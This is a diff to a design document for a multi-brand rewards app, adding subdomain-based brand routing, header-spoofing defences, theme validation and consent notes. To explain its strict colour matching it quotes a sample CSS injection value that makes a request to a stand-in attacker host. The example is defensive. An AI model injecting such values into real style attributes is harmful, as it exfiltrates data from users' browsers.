@@ -138,14 +138,71 @@ lawful basis before it is ever built.
 
 ### Routing: subdomain per brand
 
-`{slug}.qumo.app`. One deployment, wildcard certificate, theme resolved from
-the `Host` header in middleware. Cookies scope naturally per subdomain, which
-means a session on one brand's site does not automatically carry to another —
+*Built in Phase D.*
+
+`{slug}.{root}`. One deployment, wildcard certificate, theme resolved from the
+`Host` header in the proxy. Cookies scope naturally per subdomain, which means
+a session on one brand's site does not automatically carry to another —
 correct isolation, and the "one tap to opt in" recognition happens by phone at
-sign-in rather than by a shared cookie.
+sign-in rather than by a shared cookie. That is visible rather than theoretical:
+sign in at `chicken-licken.…`, open `campari.…` in the same browser, and you
+get a login page.
+
+The apex is deliberately not a brand. Nor is `www`, nor any of a reserved list
+(`app`, `admin`, `api`, `console`, …) that the brand console and the API will
+want later — enforced at resolution rather than only at sign-up, so a row
+written straight into the database still cannot claim one. A host that names no
+brand is *rewritten* to `/no-brand`, which keeps the typed address in the bar
+and, more importantly, means no page component runs without a brand.
+
+**The root domain is configuration, not a constant** —
+`NEXT_PUBLIC_QUMO_ROOT_DOMAIN`, read at build time because the proxy is
+compiled into the Edge runtime. It defaults to `localhost`, which makes
+`chicken-licken.localhost:3000` a working local brand host with no hosts-file
+editing, and it means the still-open `qumo.app` / `qumo.co.za` question does
+not block anything.
+
+**How the brand reaches the Node side.** The proxy resolves the slug from the
+`Host` header and sets `x-qumo-brand`, having *deleted* any incoming copy
+first. That delete is the whole defence, not a belt-and-braces addition: a
+header is the one part of a request a client fully controls, so a proxy that
+merely added the header would let `X-Qumo-Brand: some-other-brand` select a
+brand directly. Hostname parsing happens in exactly one place; the Node side
+reads the header and never re-parses.
+
+**What a brand actually gets to change.** Display name, tagline, logo, support
+contact, and one accent colour with its ink. The accent overrides exactly two
+CSS custom properties — the primary button and its text — because the shopper
+stylesheet was already written against tokens. A brand owns the element that
+says what happens next; it does not get to recolour type, ground or rules, so
+it cannot make its own programme unreadable.
+
+Colours are *matched* against `^#[0-9a-fA-F]{6}$`, not sanitised. The value
+lands in a `style` attribute, and a CSS value is not text: `red;background:
+url(https://evil/?c=` is a request off every shopper's phone. Logos must be
+absolute `https` for the same reason plus a duller one — an `http` logo is a
+mixed-content block that presents as a brand with no logo and nobody knowing
+why. Invalid values degrade to absent, so a brand that pastes a malformed
+colour gets the default black button rather than a broken page.
+
+**Cross-brand scans are refused, and the refusal costs nothing.** A slip or
+pack code opened on the wrong brand's host is rejected before anything is
+awarded or burned, so the shopper can still use it at the right address. This
+never protected the money — the award has always been driven by the code's own
+`brandId` — but it makes "a page under brand X shows only brand X" true rather
+than nearly true, and a shopper cannot tell those two apart by looking. The
+check is a parameter on the engine call rather than a rule in the page, because
+not every carrier asserts a brand: an SMS arrives with a code and a phone
+number and no host at all, and the absence of a claim is not a mismatched one.
 
 Custom domains (`rewards.chickenlicken.co.za`) become a later upsell without
 changing the model.
+
+**One thing deliberately not narrowed.** The data export still spans every
+brand the shopper has joined, on every brand's site. It is generated for the
+signed-in shopper and sent to them; narrowing it to the host would answer a
+different question than a subject access request asks. The screen says so in
+as many words.
 
 ### Two code types, two jobs
 
@@ -335,9 +392,12 @@ and shares every fix below:
 **Phase C — extraction.** New repo, new database, copy the engine, drop the
 CIOS-specific models. Nothing shared at runtime.
 
-**Phase D — brand identity layer.** `Brand.slug` as subdomain, theme fields,
-host-based resolution in middleware, invert the shopper shell so the brand is
-the identity and Qumo is the footer.
+**Phase D — brand identity layer. Done.** `Brand.slug` as subdomain, theme
+fields, host-based resolution in the proxy, and the shopper shell inverted so
+the brand is the identity and Qumo is a footer line. Details above under
+*Routing*. Proven by driving two brands in a browser, in both colour schemes,
+plus 22 tests across host parsing, colour injection, header spoofing and
+cross-brand scans.
 
 **Phase E — brand console.** Own app, own auth, own nav. Promotions, stores,
 poster and sticker codes, analytics, billing.
@@ -379,6 +439,14 @@ asserting it in a unit test.
   today; secure tags are their own phase.
 
 ## Open, and needing you
+
+- **The consent copy is now the one place Qumo leads on a brand's page**, and
+  it was not rewritten. It reads "I agree to Qumo storing my mobile number and
+  my activity with the brands I scan" — still true, and arguably now more
+  important to say plainly, but written for a page that led with Qumo. Whether
+  it should also name the brand being joined depends on the operator vs
+  responsible party decision below, and rewriting versioned consent copy twice
+  is worse than rewriting it once. `WEB_CONSENT_VERSION` is untouched.
 
 - **Which moment is NFC for?** The pack case is free today. A poster at the
   counter is where secure tags earn their cost. At the till the slip already
